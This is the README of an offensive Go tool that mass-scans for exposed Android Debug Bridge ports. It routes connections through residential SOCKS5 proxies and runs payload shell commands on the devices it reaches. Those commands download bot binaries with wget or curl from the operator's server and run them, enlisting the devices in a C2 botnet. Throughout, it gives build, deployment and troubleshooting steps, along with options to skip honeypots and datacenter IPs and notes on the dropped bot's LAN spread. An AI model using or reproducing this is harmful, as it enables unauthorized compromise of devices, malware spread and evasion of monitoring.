# ADB proxy loader

Go **ADB spread loader**: connects to targets discovered by `zmap` through a **residential SOCKS5 proxy**, runs payload commands over open ADB (usually `:5555`) via shell/exec. The bot binary is downloaded over HTTP **from the infected device**; connecting to C2 is a separate step inside the bot (host/port configured at bot build time).

```
zmap -p 5555 -o -  <range>  ──►  ./adb 5555 -j 500
                                      │
                                      ├── proxies.txt (SOCKS5)
                                      └── payloads.txt (shell commands)
```

**Recommended:** Do not run `zmap` or `./adb` alone — use `spread.sh`, which couples both processes with a FIFO.

---

## Requirements

| Component | Notes |
|-----------|--------|
| **Go** | 1.24+ (`/usr/local/go/bin` — distro packages below 1.24 are too old) |
| **zmap** | Emits target IPs, port 5555 |
| **proxies.txt** | At least one working SOCKS5 line |
| **payloads.txt** | At least one payload line |
| **Linux** | Scanner host with enough FDs/CPU for high `-j` |

---

## Build

```bash
cd "adb proxy"
export PATH=/usr/local/go/bin:$PATH
go mod tidy
go build -o adb .
chmod +x adb spread.sh stop-spread.sh
```

---

## Configuration

### `proxies.txt`

One **SOCKS5** proxy per line (HTTP proxies are not supported). Do not use an `http://` prefix.

```text
username:password@proxy.example.com:1080
```

- Use your provider’s **SOCKS5** port (not HTTP-only ports).
- Proxies must support **CONNECT** to arbitrary target `:5555`; testing only `:443` is insufficient.

Check proxies:

```bash
python3 check_proxies.py proxies.txt
```

### `payloads.txt`

Each line is **one shell command** executed on the device. Blank lines and `#` comments are skipped.

Typical payload logic (you define the exact line):

- Writable paths on device (e.g. `/data/local/tmp`, `/sdcard/Download`)
- `getprop ro.product.cpu.abi` to pick `main_arm64` vs `main_arm7` (or your binary names)
- Fallbacks: `toybox wget` / `busybox wget` / `curl`
- Optional minimum file size check before `chmod` and background exec (`setsid` / `nohup`)
- **HTTP base URL** must point at **your** payload server (same binaries you built for Layer4)

---

## Running (recommended)

### `spread.sh`

`adb` reads from a FIFO first; `zmap` writes stdout into the FIFO. If `adb` exits, `zmap` is killed; the loop restarts after a short delay.

```bash
screen -S adb
cd /path/to/adb-proxy
./spread.sh
# Ctrl+A D  — detach
```

Pass zmap arguments (allowlist, CIDR, rate):

```bash
SPREAD_ZMAP_ARGS="-w allowlist.txt" ./spread.sh
# or
./spread.sh 203.0.113.0/24
```

Environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `ADB_PORT` | `5555` | ADB port |
| `ADB_THREADS` | `500` | Worker count (`-j`) |
| `SPREAD_RESTART_SEC` | `3` | Delay before restart |
| `ADB_BIN` | `./adb` | Path to loader binary |
| `SPREAD_ZMAP_ARGS` | (empty) | Extra zmap arguments |

Logs: `zmap.log` (zmap stderr).

### Stop

```bash
./stop-spread.sh
```

Optional helper script (if you use it on your scanner): `remote-adb-only.sh` — stops other jobs and starts ADB-only spread.

---

## Manual pipe (advanced)

```bash
zmap -p 5555 -o - <range> | ./adb 5555 -j 500
```

Stdin must **not** be a TTY; otherwise the loader exits with:

```text
stdin must be a pipe from zmap (got terminal)
```

---

## CLI options

```text
Usage: zmap -p <port> <range> | ./adb <port> [options]

  -j, --threads <int>     Concurrent workers (default 100; spread.sh uses 500)
  -d, --debug             Verbose logging
  -f, --debug-full        Dump raw data on magic mismatch
  -o, --output            Print shell command output
  --hits <file>           ShellOK targets (default: hits.txt)
  -skip-cloud             Skip datacenter IPs (default: true)
  -skip-trap              Skip likely ADB honeypots (default: true)
```

Disable honeypot/cloud filters (use with care):

```bash
./adb 5555 -j 500 -skip-cloud=false -skip-trap=false
```

---

## Live stats line

Single-line counters:

| Field | Meaning |
|-------|---------|
| **Tried** | Target lines processed |
| **SkipDC** | Datacenter IP skipped (`-skip-cloud`) |
| **SkipTrap** | Likely honeypot skipped (`-skip-trap`) |
| **Connected** | TCP + ADB session up |
| **Auth** | Authentication required |
| **Executed** | Shell/exec command sent |
| **ShellOK** | “Real” shell for payload (time/output heuristics) |
| **Failed** | Connection/command errors |
| **Killed** | Internal counter |

### `hits.txt`

Targets that reached **ShellOK**, once per IP:

```text
2026-09-18T12:00:00Z 203.0.113.50:5555
```

```bash
tail -f hits.txt
wc -l hits.txt
```

---

## Hit ≠ bot

| Metric | What it measures |
|--------|------------------|
| **ShellOK / hits.txt** | Device accepted the payload shell command |
| **CNC bot listener** | Binary downloaded, ran, and opened TCP to your C2 |

High hits with few bots is common: payload URL unreachable from the device, size/arch mismatch, outbound C2 port blocked, bot-side DNS/resolver behavior, or device reboot.

Bot count: use your CNC admin panel or check established connections on the C2 host for the configured bot port (see parent project docs).

---

## Protocol flow

1. SOCKS5 **CONNECT** to target `IP:port`  
2. ADB **CNXN** / **AUTH** if needed  
3. Honeypot-style banner → **SkipTrap**  
4. Payload via `shell:`; fallback **`exec:`**  
5. Success: **shellLooksReal** (WRTE/CLSE, minimum duration, optional output)  
6. **ShellOK** → append **`hits.txt`**

Proxies cover **scanner → target ADB** only; `wget`/`curl` on the device use whatever URL you put in `payloads.txt`.

---

## Health checks

```bash
# Both should be present
pgrep -af 'zmap -p 5555'
pgrep -af './adb 5555'

# Payload HTTP (replace with your host and binary names)
curl -sI "http://<PAYLOAD_HOST>/main_arm64" | head -1
curl -sI "http://<PAYLOAD_HOST>/main_arm7" | head -1

screen -ls
```

---

## Files

| File | Description |
|------|-------------|
| `main.go` | ADB loader |
| `spread.sh` | zmap + adb supervisor (FIFO) |
| `stop-spread.sh` | Stop spread processes |
| `proxies.txt` | SOCKS5 list |
| `payloads.txt` | Payload shell commands |
| `hits.txt` | ShellOK log (created at runtime) |
| `zmap.log` | zmap stderr |
| `check_proxies.py` | SOCKS5 + CONNECT to :5555 test |
| `tut.txt` | Short ops notes |
| `remote-adb-only.sh` | Optional: ADB-only spread helper |

---

## Related bot behavior

The dropped binary may run **LAN ADB spread** (`../bot/adb_spread.c` — private /24, port 5555). This directory is only the **external scanner + ADB loader**.

---

## Troubleshooting

| Symptom | Likely cause |
|---------|----------------|
| `adb exited immediately` | Empty or invalid `proxies.txt` / `payloads.txt` |
| Tried rises, Connected stays 0 | Dead proxies or closed targets |
| ShellOK but no bots | Payload URL, binary arch, C2 reachability, or DNS in bot build |
| Only zmap running | `spread.sh` not used — targets are not loaded |
| High SkipTrap | Normal on honeypot-heavy networks |

More context: parent [`README.md`](../README.md), [`tut.txt`](tut.txt).
